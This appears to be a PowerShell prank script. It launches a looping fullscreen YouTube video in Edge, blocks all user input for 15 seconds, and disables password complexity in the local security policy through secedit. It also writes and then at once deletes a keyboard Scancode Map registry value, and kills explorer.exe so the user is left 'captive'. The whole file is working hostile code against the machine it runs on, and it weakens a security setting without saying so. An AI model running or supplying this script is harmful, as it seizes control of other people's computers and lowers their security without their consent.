#src https://github.com/stefanstranger/PowerShell/blob/master/WinKeys.ps1
$source = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
namespace KeyboardSend
{
    public class KeyboardSend
    {
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
        private const int KEYEVENTF_EXTENDEDKEY = 1;
        private const int KEYEVENTF_KEYUP = 2;
        public static void KeyDown(Keys vKey)
        {
            keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY, 0);
        }
        public static void KeyUp(Keys vKey)
        {
            keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        }
    }
}
"@

Add-Type -TypeDefinition $source -ReferencedAssemblies "System.Windows.Forms"

Function FullScreen ()
{
    [KeyboardSend.KeyboardSend]::KeyDown("LWin")
    [KeyboardSend.KeyboardSend]::KeyDown("LShiftKey")
    [KeyboardSend.KeyboardSend]::KeyDown("Return")
    [KeyboardSend.KeyboardSend]::KeyUp("LWin")
    [KeyboardSend.KeyboardSend]::KeyUp("LShiftKey")
    [KeyboardSend.KeyboardSend]::KeyUp("Return")
}

Function KillKeyLayout ()
{
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 0000000000000000030000004de01de04be01d0000000000 /f
    reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /f
}    

Function DisableSecureLogOn () 
{
    #wraps Secedit to perform command since Powershell can't
    #current replaces password policy. Want to change to edit Secure Log On (that requires CTRL ALT DEL)
    secedit /export /cfg c:\new.cfg
    ${c:new.cfg}=${c:new.cfg} | % {$_.Replace('PasswordComplexity=1', 'PasswordComplexity=0')}
    secedit /configure /db $env:windir\security\new.sdb /cfg c:\new.cfg /areas SECURITYPOLICY
    del c:\new.cfg
}

# Start the app
$app='microsoft-edge'
$value='https://www.youtube.com/embed/qxEh09JttN4?rel=0&amp;autoplay=1;fs=0;autohide=0;hd=0;playlist=qxEh09JttN4&autoplay=1&loop=1'
$startString = $app + ":" + $value
start $startString

# Wait and send key stroke 
sleep 1
FullScreen
$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

function Disable-UserInput($seconds) {
    $userInput::BlockInput($true)
    Start-Sleep $seconds
    $userInput::BlockInput($false)
}

Disable-UserInput -seconds 15 | Out-Null
DisableSecureLogOn
KillKeyLayout

# Restart explorer to force it to load the bad key layout
taskkill /f /im explorer.exe
start explorer.exe

# Now kill explorer again. Because we want our audience captive. :)
taskkill /f /im explorer.exe
